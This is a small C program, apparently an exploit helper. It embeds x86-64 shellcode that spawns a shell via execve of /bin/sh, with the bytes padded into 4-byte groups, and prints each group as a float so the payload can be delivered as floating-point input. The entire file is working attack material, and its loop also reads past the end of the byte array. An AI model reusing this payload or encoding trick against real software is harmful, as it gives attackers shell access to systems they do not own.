#include<stdio.h>

char code[] = "\x31\xc0\x48\xe9\xbb\xd1\x9d\xe9\x96\x91\xd0\xe9\x8c\x97\xff\xe9\x48\xf7\xdb\xe9\x53\x54\x5f\xe9\x99\x52\x57\xe9\x54\x5e\xb0\xe9\x3b\x0f\x05\xe9";
int main(){
  int i;
  float res;
  for(i=0; i<10; i++){
    res = *(float*)&code[4*i];
    printf("%f\n", res);
  }
}